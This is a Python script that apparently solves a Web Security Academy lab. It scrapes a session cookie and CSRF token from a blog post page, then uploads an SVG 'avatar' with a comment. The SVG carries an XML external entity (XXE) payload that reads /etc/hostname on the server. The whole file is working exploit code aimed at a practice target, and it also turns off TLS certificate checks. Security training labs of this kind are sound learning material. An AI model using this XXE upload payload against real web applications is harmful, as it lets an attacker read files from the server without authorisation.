import http.client
import io
import re
import ssl
import urllib.parse

from werkzeug.datastructures.file_storage import FileStorage
from werkzeug.test import encode_multipart

LAB_ID = "???"


def GET_post(
        postId: str,
) -> http.client.HTTPResponse:
    method, path = 'GET', '/post'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    query_params = [
        ('postId', postId),
    ]
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
    }
    body = ''
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, f"{path}?{urllib.parse.urlencode(query_params)}", body, headers)
    return connection.getresponse()


def POST_post_comment(
        session: str,
        csrf: str,
        postId: str,
) -> http.client.HTTPResponse:
    method, path = 'POST', '/post/comment'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'content-type': 'multipart/form-data; boundary=---------------------------2397812972174695564864815914',
        'cookie': f'session={session}',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'priority': 'u=0, i',
        'te': 'trailers',
    }
    fields = {
        'csrf': csrf,
        'postId': postId,
        'comment': 'tturuoert',
        'name': 'tturuoert',
        'email': 'tturuoert@tturuoert.com',
        'website': 'https://tturuoert.com',
    }
    files = {
        'avatar': {
            'filename': 'image.svg',
            'content_type': 'image/svg+xml',
            'content': """<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>""",
        },
    }
    _, body = encode_multipart(
        boundary='---------------------------2397812972174695564864815914',
        values={
                   field_name: field_value
                   for field_name, field_value in fields.items()
               } | {
                   field_name: FileStorage(
                       filename=file['filename'],
                       content_type=file['content_type'],
                       stream=io.BytesIO(file['content'].encode('utf-8')),
                   ) for field_name, file in files.items()
               },
    )
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


def post_session_and_csrf(postId: str) -> tuple[str, str]:
    response = GET_post(postId)
    cookie_header = response.getheader('set-cookie')
    session = re.findall(r'session=([a-zA-Z0-9]+);', cookie_header)[0]
    csrf = re.findall(r'name="csrf" value="([a-zA-Z0-9]+)"', response.read().decode('utf-8'))[0]
    return session, csrf


postId = 5
session, csrf = post_session_and_csrf(postId)
response = POST_post_comment(session, csrf, postId)
print(response.status)
for name, header in response.headers.items():
    print(f"{name}: {header}")
print(response.read().decode())
